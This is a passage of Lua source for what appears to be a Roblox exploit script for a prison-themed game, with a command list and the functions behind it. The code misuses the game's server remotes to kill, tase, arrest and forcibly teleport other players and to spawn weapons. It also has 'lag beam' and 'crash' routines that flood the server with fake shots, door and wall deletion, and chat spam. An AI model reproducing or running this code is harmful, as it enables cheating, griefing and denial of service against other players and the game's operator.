	Cmd[#Cmd + 1] =	{Text = "resethipheight / rehipheight",Title = "Reset hip heights"}
	Cmd[#Cmd + 1] =	{Text = "resetgravity / regravity",Title = "Reset gravity"}
	Cmd[#Cmd + 1] =	{Text = "makecrim [plr]",Title = "Make the player become a criminal"}
	Cmd[#Cmd + 1] =	{Text = "makecrimall",Title = "Make all players become a criminals"}
	Cmd[#Cmd + 1] =	{Text = "loopbring [plr]",Title = "Loop bring player"}
	Cmd[#Cmd + 1] =	{Text = "unloopbring ",Title = "Unloop bring player"}
	Cmd[#Cmd + 1] =	{Text = "baseballbat / bat",Title = "Gets bat"}
	Cmd[#Cmd + 1] =	{Text = "superknife",Title = "Gets super knife"}
	Cmd[#Cmd + 1] =	{Text = "firespeed / setfirespeed [count]",Title = "Changes fire speed for the gun"}
	Cmd[#Cmd + 1] =	{Text = "autofire",Title = "Changes gun ststes to auto fire"}
	Cmd[#Cmd + 1] =	{Text = "semifire",Title = "Changes gun ststes to semi fire"}
	Cmd[#Cmd + 1] =	{Text = "burst / burstbullets / bullets [count]",Title = "Changes a bullets for the gun will come out when shot"}
	Cmd[#Cmd + 1] =	{Text = "reloadtime / reloadtimes [count]",Title = "Changes reload times for the gun"}
	Cmd[#Cmd + 1] =	{Text = "gun / guns / allguns",Title = "Obtains all guns"}
	Cmd[#Cmd + 1] =	{Text = "autogun / autoguns / autoallguns",Title = "Activate auto gun when respawned"}
	Cmd[#Cmd + 1] =	{Text = "unautogun / unautoguns / unautoallguns",Title = "Unactivate auto gun when respawned"}
	Cmd[#Cmd + 1] =	{Text = "taserbypass / antitaser / lock",Title = "Bypass taser when got tased"}
	Cmd[#Cmd + 1] =	{Text = "untaserbypass / notaserbypass / unlock",Title = "Unbypass taser when got tased"}
	Cmd[#Cmd + 1] =	{Text = "nodoors / deletedoors",Title = "Deletes all doors"}
	Cmd[#Cmd + 1] =	{Text = "restoredoors / doors",Title = "Restores all doors"}
	Cmd[#Cmd + 1] =	{Text = "nowalls / deletewalls - delete walls",Title = "Deletes all walls"}
	Cmd[#Cmd + 1] =	{Text = "walls / restorewalls - restore walls",Title = "Restore all walls"}
	Cmd[#Cmd + 1] =	{Text = "anticrash / antivest",Title = "Anti crash when someone spamming armor"}
	Cmd[#Cmd + 1] =	{Text = "unanticrash / unantivest",Title = "Unanti crash when someone spamming armor"}
	Cmd[#Cmd + 1] =	{Text = "antishield / noshield",Title = "Anti shield users"}
	Cmd[#Cmd + 1] =	{Text = "unantishield",Title = "Unanti shield users"}
	Cmd[#Cmd + 1] =	{Text = "gatetower",Title = "Teleports to the gate tower"}
	Cmd[#Cmd + 1] =	{Text = "tower",Title = "Teleports to the yard tower"}
	Cmd[#Cmd + 1] =	{Text = "sewer",Title = "Teleports to the sewer"}
	Cmd[#Cmd + 1] = {Text = "yard",Title = "Teleports to yard"}
	Cmd[#Cmd + 1] =	{Text = "backnexus",Title = "Teleports to the back nexus"}
	Cmd[#Cmd + 1] =	{Text = "nexus",Title = "Teleports to the nexus"}
	Cmd[#Cmd + 1] =	{Text = "gate",Title = "Teleports to the gate"}
	Cmd[#Cmd + 1] = {Text = "findowner / checkscriptowner",Title = "Find a script owner in the server"}
	Cmd[#Cmd + 1] = {Text = "getplayer / getplayers",Title = "Get a players counts in the server"}
	Cmd[#Cmd + 1] = {Text = "rapidfire",Title = "Activate rapid fire"}
	Cmd[#Cmd + 1] = {Text = "autorapidfire",Title = "Auto activate rapid fire"}
	Cmd[#Cmd + 1] = {Text = "unautorapidfire",Title = "Unauto activate rapid fire"}
	Cmd[#Cmd + 1] =	{Text = "armory",Title = "Teleports to the armory"}
	Cmd[#Cmd + 1] =	{Text = "cafe - teleport to cafe",Title = "Teleports to the cafeteria"}
	Cmd[#Cmd + 1] =	{Text = "crimbase / criminalbase",Title = "Teleports to the criminals base"}
	Cmd[#Cmd + 1] =	{Text = "lunchroom",Title = "Teleports to the cafeteria room"}
	Cmd[#Cmd + 1] =	{Text = "spamB [delay]",Title = "Spam the chat"}
	Cmd[#Cmd + 1] =	{Text = "unspamchat",Title = "Unspam the chat"}
	Cmd[#Cmd + 1] =	{Text = "savepos / saveposition",Title = "Saves positions"}
	Cmd[#Cmd + 1] =	{Text = "loadpos / loadposition",Title = "Loads positions"}
	Cmd[#Cmd + 1] =	{Text = "notify",Title = "Send a message when player leave / join"}
	Cmd[#Cmd + 1] =	{Text = "nonotify",Title = "Stop send a message when player leave / join"}
	Cmd[#Cmd + 1] =	{Text = "copychat",Title = "Copies all players chats"}
	Cmd[#Cmd + 1] =	{Text = "uncopychat",Title = "uncopies all players chats"}
	Cmd[#Cmd + 1] =	{Text = "chatnotify",Title = "Chats when player leave / join"}
	Cmd[#Cmd + 1] =	{Text = "unchatnotify / nochatnotify",Title = "Stop chat when player leave / join"}
	Cmd[#Cmd + 1] =	{Text = "opengate",Title = "Open the gate"}
	Cmd[#Cmd + 1] =	{Text = "antifell / antivoid",Title = "Activate anti fell to the void when respawn as custom team"}
	Cmd[#Cmd + 1] =	{Text = "unantifell / unantivoid",Title = "Unactivate anti fell to the void when respawn as custom team"}
	Cmd[#Cmd + 1] =	{Text = "beam [plr]",Title = "Shoot a beam to player"}
	Cmd[#Cmd + 1] =	{Text = "lagbeam / beam2 [plr]",Title = "Shoot a beam to player but lag"}
	Cmd[#Cmd + 1] =	{Text = "crash / beam3 [plr]",Title = "Shoot a beam to player but even more lag"}
	Cmd[#Cmd + 1] = {Text = "antispamarrest",Title = "Activate anti spam arrest"}
	Cmd[#Cmd + 1] = {Text = "unantispamarrest",Title = "Unactivate anti spam arrest"}
	Cmd[#Cmd + 1] =	{Text = "!getprefix",Title = "If you for get prefix you can type this in chat"}

	local Mouse = game.Players.LocalPlayer:GetMouse()

	for i = 1,#Cmd do
		local clone = CmdText:Clone()
		clone.Text = Cmd[i].Text
		clone.Name = "COMMANDS"
		local Ins = Instance.new("StringValue", clone)
		Ins.Name = "Title"
		Ins.Value = Cmd[i].Title
		local Ins2 = Instance.new("StringValue", clone)
		Ins2.Name = "TopbarName"
		Ins2.Value = Cmd[i].Text:split(" ")[1]
		clone.Parent = CmdHandler
		clone.MouseButton1Click:Connect(function()
			Execute:CaptureFocus()
			Execute.Text = clone.Text:split(" ")[1]
			Execute.CursorPosition = #Execute.Text + 1
		end)
	end

	Mouse.Move:Connect(function()
		local Guis = game:GetService("CoreGui"):GetGuiObjectsAtPosition(Mouse.X, Mouse.Y)
		local Gui
		for i,v in pairs(Guis) do
			if v.Parent == CmdHandler then
				Gui = v
			end
		end
		if Gui ~= nil then
			local PositionX
			local PositionY
			local X = Mouse.X
			local Y = Mouse.Y
			if Mouse.X > 200 then
				PositionX = Mouse.X - 201
			else
				PositionX = Mouse.X + 21
			end
			if Mouse.Y > (Mouse.ViewSizeY-96) then
				PositionY = Mouse.Y - 97
			else
				PositionY = Mouse.Y
			end
			Background3.Visible = true
			Background3.Position = UDim2.new(0, PositionX, 0, PositionY)
			Topbar.Text = Gui.TopbarName.Value
			CmdTitle.Text = Gui.Title.Value
		else
			Background3.Visible = false
		end
	end)

	if DisableScript then
		DisableScript()
	end

	local Slient = false
	local ScriptDisabled = false
	local LoopBeam = {}
	local LoopKill = {}
	local LoopTase = {}
	local Admin = {}
	local Watching = nil
	local States = {}
	local BuyGamepass = game:GetService("MarketplaceService"):UserOwnsGamePassAsync(tonumber((game:GetService("Players").LocalPlayer.CharacterAppearance):split('=')[#((game:GetService("Players").LocalPlayer.CharacterAppearance):split('='))]), 96651)

	local function GetPlayer(String)
		if not String then return end
		local Yes = {}
		for _, Player in ipairs(game.Players:GetPlayers()) do
			if string.lower(Player.Name):match(string.lower(String)) or string.lower(Player.DisplayName):match(string.lower(String)) then
				table.insert(Yes, Player)
			end
		end
		if #Yes > 0 then
			return Yes[1]
		elseif #Yes < 1 then
			return nil
		end
	end

	local function GetPos()
		return game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
	end

	local function GetCamPos()
		return workspace.CurrentCamera.CFrame
	end

	local function GetTeam()
		return game.Players.LocalPlayer.TeamColor.Name
	end

	function Goto(Player, Distance)
		local Distance = Distance or CFrame.new(0, 0, 0)
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Player.Character.HumanoidRootPart.CFrame * Distance
	end

	function Split(Arguaments, Split)
		if not Arguaments or not Split then return end
		return Arguaments:split(Split)
	end

	function ChatNotify(Message, Colors, Size)
		game.StarterGui:SetCore("ChatMakeSystemMessage", {
			Text = Message,
			Color = Colors or Color3.fromRGB(255, 255, 255),
			Font = Enum.Font.SourceSans,
			FontSize = Size or Enum.FontSize.Size48
		})
	end

	function Chat(Message, Whisper)
		game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(Message, Whisper or "ALl")
	end

	function WaitForChild(Time, Parent, Child)
		if not Parent or not Child then return end
		if Parent == "LocalPlayer" then Parent = game.Players.LocalPlayer end
		if Parent == "Character" then Parent = game.Players.LocalPlayer.Character end
		if Parent == "Backpack" then Parent = game.Players.LocalPlayer.Character.Backpack end
		local Times = Time * 10 or 1
		repeat wait(.1)
			Time = Time - 1
		until Parent:FindFirstChild(Child) or Time <= 0
		if Parent and Parent:FindFirstChild(Child) then
			return Parent:FindFirstChild(Child)
		else
			return nil
		end
	end

	function Kill(Player)
		pcall(function()
			if Player.Character:FindFirstChild("ForceField") or not workspace:FindFirstChild(Player.Name) or not workspace:FindFirstChild(Player.Name):FindFirstChild("Head") or Player == nil or Player.Character.Parent ~= workspace then return end
			workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)

			local MyTeam = GetTeam()
			if Player.TeamColor.Name == game.Players.LocalPlayer.TeamColor.Name then
				local savedcf = GetPos()
				local savedcamcf = GetCamPos()
				workspace.Remote.loadchar:InvokeServer(nil, BrickColor.random().Name)
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
				workspace.CurrentCamera.CFrame = savedcamcf
				workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
			end

			local Gun = game.Players.LocalPlayer.Character:FindFirstChild("Remington 870") or game.Players.LocalPlayer.Backpack:FindFirstChild("Remington 870")

			local FireEvent = {
				[1] = {
					["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
					["Distance"] = 0, 
					["Cframe"] = CFrame.new(), 
					["Hit"] = workspace[Player.Name].Head
				}, [2] = {
					["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
					["Distance"] = 0, 
					["Cframe"] = CFrame.new(), 
					["Hit"] = workspace[Player.Name].Head
				}, [3] = {
					["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
					["Distance"] = 0, 
					["Cframe"] = CFrame.new(), 
					["Hit"] = workspace[Player.Name].Head
				}, [4] = {
					["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
					["Distance"] = 0, 
					["Cframe"] = CFrame.new(), 
					["Hit"] = workspace[Player.Name].Head
				}, [5] = {
					["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
					["Distance"] = 0, 
					["Cframe"] = CFrame.new(), 
					["Hit"] = workspace[Player.Name].Head
				}, [6] = {
					["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
					["Distance"] = 0, 
					["Cframe"] = CFrame.new(), 
					["Hit"] = workspace[Player.Name].Head
				}, [7] = {
					["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
					["Distance"] = 0, 
					["Cframe"] = CFrame.new(), 
					["Hit"] = workspace[Player.Name].Head
				}, [8] = {
					["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
					["Distance"] = 0, 
					["Cframe"] = CFrame.new(), 
					["Hit"] = workspace[Player.Name].Head
				}
			}

			game:GetService("ReplicatedStorage").ShootEvent:FireServer(FireEvent, Gun)
			Gun.Parent = game.Players.LocalPlayer.Character
			game.Players.LocalPlayer.Character["Remington 870"]:Destroy()
		end)
	end

	function Tase(Player)
		if Player.TeamColor.Name == "Bright blue" or not workspace:FindFirstChild(Player.Name) or not workspace:FindFirstChild(Player.Name):FindFirstChild("Head") or Player == nil or Player.Character.Parent ~= workspace then return end
		pcall(function()
			local savedcf = GetPos()
			local savedteam

			local Gun = game.Players.LocalPlayer.Backpack:FindFirstChild("Taser") or game.Players.LocalPlayer.Character:FindFirstChild("Taser")

			local changedteam = false
			if game.Players.LocalPlayer.TeamColor.Name ~= "Bright blue" or not Gun then
				savedteam = GetTeam()
				workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new("Bright blue").Name)
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
				changedteam = true
			end

			local Guns = game.Players.LocalPlayer.Backpack:FindFirstChild("Taser") or game.Players.LocalPlayer.Character:FindFirstChild("Taser")

			local TaseEvent = 
				{
					[1] = 
					{
						["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
						["Distance"] = 0, 
						["Cframe"] = CFrame.new(), 
						["Hit"] = workspace[Player.Name].Torso
					}
				}

			game:GetService("ReplicatedStorage").ShootEvent:FireServer(TaseEvent, Guns)
			if changedteam then
				workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new(savedteam).Name)
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
			end
		end)
	end

	function Teleport(Player, Position)
		if Player == nil or Position == nil then return end
		local savedcf = GetPos()
		workspace.Remote.loadchar:InvokeServer()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
		workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M9"].ITEMPICKUP)
		local CHAR = game.Players.LocalPlayer.Character
		CHAR.Humanoid.Name = "1"
		local c = CHAR["1"]:Clone()
		c.Name = "Humanoid"
		c.Parent = CHAR
		CHAR["1"]:Destroy()
		game.Workspace.CurrentCamera.CameraSubject = CHAR
		CHAR.Animate.Disabled = true
		wait()
		CHAR.Animate.Disabled = false
		CHAR.Humanoid.DisplayDistanceType = "None"
		game.Players.LocalPlayer:FindFirstChild("Backpack"):FindFirstChild("M9").Parent = CHAR
		local STOP = 0
		repeat wait(.1)
			STOP = STOP + 1
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Player.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 0.75)
		until (not game.Players.LocalPlayer.Character:FindFirstChild("M9") or not game.Players.LocalPlayer.Character.HumanoidRootPart or not Player.Character.HumanoidRootPart or not game.Players.LocalPlayer.Character.HumanoidRootPart.Parent or not Player.Character.HumanoidRootPart.Parent or STOP > 500) and STOP > 3
		local STOP_2 = 0
		repeat wait()
			STOP_2 = STOP_2 + 1
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Position
		until STOP_2 > 10
		workspace.Remote.loadchar:InvokeServer()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
	end

	function TeleportV(Player, Player2)
		if Player == nil or Player2 == nil then return end
		local savedcf = GetPos()
		workspace.Remote.loadchar:InvokeServer()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
		workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M9"].ITEMPICKUP)
		local CHAR = game.Players.LocalPlayer.Character
		CHAR.Humanoid.Name = "1"
		local c = CHAR["1"]:Clone()
		c.Name = "Humanoid"
		c.Parent = CHAR
		CHAR["1"]:Destroy()
		game.Workspace.CurrentCamera.CameraSubject = CHAR
		CHAR.Animate.Disabled = true
		wait()
		CHAR.Animate.Disabled = false
		CHAR.Humanoid.DisplayDistanceType = "None"
		game.Players.LocalPlayer:FindFirstChild("Backpack"):FindFirstChild("M9").Parent = CHAR
		local STOP = 0
		repeat wait(.1)
			STOP = STOP + 1
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Player.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 0.75)
		until (not game.Players.LocalPlayer.Character:FindFirstChild("M9") or not game.Players.LocalPlayer.Character.HumanoidRootPart or not Player.Character.HumanoidRootPart or not game.Players.LocalPlayer.Character.HumanoidRootPart.Parent or not Player.Character.HumanoidRootPart.Parent or STOP > 500) and STOP > 3
		local STOP_2 = 0
		repeat wait()
			STOP_2 = STOP_2 + 1
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Player2.Character.HumanoidRootPart.CFrame
		until STOP_2 > 10
		workspace.Remote.loadchar:InvokeServer()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
	end

	function ArrestEvent(Player, Time)
		for i = 1,Time do
			workspace.Remote.arrest:InvokeServer(Player.Character.Head)
		end
	end

	function Arrest(Player, Time)
		local Time = Time or 1
		local savedcf = GetPos()
		local savedcamcf = GetCamPos()
		local savedteam = GetTeam()
		if Player then
			repeat wait()
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Player.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 1)
				for i = 1,Time do
					coroutine.wrap(function()
						workspace.Remote.arrest:InvokeServer(Player.Character.Head)
					end)()
				end
			until Player.Character:FindFirstChild("Head"):FindFirstChild("handcuffedGui")
			wait()
		end
		workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new(savedteam).Name)
		game.Players.LocalPlayer.Character.Humanoid.Sit = false
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
		workspace.CurrentCamera.CFrame = savedcamcf
	end

	function CreateBeam(Player, Distance, Position)
		if Player then
			pcall(function()
				local Backpack = game.Players.LocalPlayer.Backpack
				local Character = game.Players.LocalPlayer.Character
				local Gun = Backpack:FindFirstChild("Remington 870") or Character:FindFirstChild("Remington 870")
				if not Gun then
					workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
				end
				Gun = Backpack:FindFirstChild("Remington 870") or Character:FindFirstChild("Remington 870")
				local Head = Player.Character.Head
				if Head and Player and Character and Backpack and Gun and Distance and Position then
					game.ReplicatedStorage.ShootEvent:FireServer({
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head}
					}, Gun)
				end
				Gun.Parent = game.Players.LocalPlayer.Character
				game.Players.LocalPlayer.Character:FindFirstChild("Remington 870"):Destroy()
			end)
		end
	end

	function CreateBeam2(Player, Distance, Position)
		if Player then
			pcall(function()
				local Backpack = game.Players.LocalPlayer.Backpack
				local Character = game.Players.LocalPlayer.Character
				local Gun = Backpack:FindFirstChild("AK-47") or Character:FindFirstChild("AK-47")
				if not Gun then
					workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["AK-47"].ITEMPICKUP)
				end
				Gun = Backpack:FindFirstChild("AK-47") or Character:FindFirstChild("AK-47")
				local Head = Player.Character.Head
				if Head and Player and Character and Backpack and Gun and Distance and Position then
					game.ReplicatedStorage.ShootEvent:FireServer({
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
					}, Gun)
				end
				Gun.Parent = game.Players.LocalPlayer.Character
				game.Players.LocalPlayer.Character:FindFirstChild("AK-47"):Destroy()
			end)
		end
	end

	function CreateBeam3(Player, Distance, Position)
		if Player then
			pcall(function()
				local Backpack = game.Players.LocalPlayer.Backpack
				local Character = game.Players.LocalPlayer.Character
				local Gun = Backpack:FindFirstChild("M9") or Character:FindFirstChild("M9")
				if not Gun then
					workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M9"].ITEMPICKUP)
				end
				Gun = Backpack:FindFirstChild("M9") or Character:FindFirstChild("M9")
				local Head = Player.Character.Head
				if Head and Player and Character and Backpack and Gun and Distance and Position then
					game.ReplicatedStorage.ShootEvent:FireServer({
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head}
					}, Gun)
				end
				Gun.Parent = game.Players.LocalPlayer.Character
				game.Players.LocalPlayer.Character:FindFirstChild("M9"):Destroy()
			end)
		end
	end

	function Beam(Player, Distance, Time)
		if Player and Distance then
			local RunService = game:GetService("RunService")
			RunService:BindToRenderStep(Player.Name, math.huge, function()
				coroutine.wrap(function()
					CreateBeam(Player, Distance, Player.Character.HumanoidRootPart.CFrame)
				end)()
			end)
			delay(Time, function()
				pcall(function()
					RunService:UnbindFromRenderStep(Player.Name)
				end)
			end)
		end
	end

	function LagBeam(Player, Distance, Time)
		if Player and Distance then
			local RunService = game:GetService("RunService")
			RunService:BindToRenderStep(Player.Name, math.huge, function()
				coroutine.wrap(function()
					CreateBeam(Player, Distance, Player.Character.HumanoidRootPart.CFrame)
				end)()
				coroutine.wrap(function()
					CreateBeam2(Player, Distance, Player.Character.HumanoidRootPart.CFrame)
				end)()
				coroutine.wrap(function()
					CreateBeam3(Player, Distance, Player.Character.HumanoidRootPart.CFrame)
				end)()
			end)
			delay(Time, function()
				pcall(function()
					RunService:UnbindFromRenderStep(Player.Name)
				end)
			end)
		end
	end

	function DetectMove(Player)
		local oldpos = Player.Character.HumanoidRootPart.CFrame
		local Move
		local Time = 0
		repeat wait(.1)
			Time = Time + 1
			if oldpos ~= Player.Character.HumanoidRootPart.CFrame then
				Move = true
			else
				Move = false
			end
		until (Time >= 500 and Move == false) or Move == true
		return Move
	end

	function FeGodMode()
		game.Players.LocalPlayer.Character.Humanoid.Name = 1
		local l = game.Players.LocalPlayer.Character["1"]:Clone()
		l.Parent = game.Players.LocalPlayer.Character
		l.Name = "Humanoid"
		game.Players.LocalPlayer.Character.Animate.Disabled = true
		wait()
		game.Players.LocalPlayer.Character.Animate.Disabled = false
		game.Players.LocalPlayer.Character["1"]:Destroy()
		game.Workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character
	end

	local function GetPlayerPart(Player)
		if not Player then return end
		if Player:FindFirstChild("HumanoidRootPart") then
			return Player.HumanoidRootPart
		elseif Player:FindFirstChild("Torso") then
			return Player.Torso
		end
	end

	local Mouse = game.Players.LocalPlayer:GetMouse()

	function CopyChat(Player)
		Player.Chatted:Connect(function(Message)
			if States.CopyChat then
				Chat("["..Player.DisplayName.."]: "..Message)
			end
		end)
	end

	function Died(Player)
		pcall(function()
			if Player.Character.Humanoid.Health < 1 then
				if States.ChatNotify then
					Chat(Player.DisplayName.." Died")
				end
				if States.Notify then
					game.StarterGui:SetCore("SendNotification", {
						Title = "Game",
						Text = Player.DisplayName.." Died",
						Icon = game.Players:GetUserThumbnailAsync(Player.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size352x352)
					})
				end
			end
		end)
	end

	function PlayerPickUp(Player)
		Player.Backpack.ChildAdded:Connect(function(Item)
			if States.ChatNotify then
				Chat(Player.DisplayName.." Pick Up "..Item.Name)
			end
			if States.Notify then
				game.StarterGui:SetCore("SendNotification", {
					Title = "Game",
					Text = Player.DisplayName.." Pick Up "..Item.Name,
					Icon = game.Players:GetUserThumbnailAsync(Player.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size352x352)
				})
			end
		end)
	end

	local function Notify(Message, Color, Text)
		Notify6.Text = Notify5.Text
		Notify6.TextColor3 = Notify5.TextColor3
		Notify5.Text = Notify4.Text
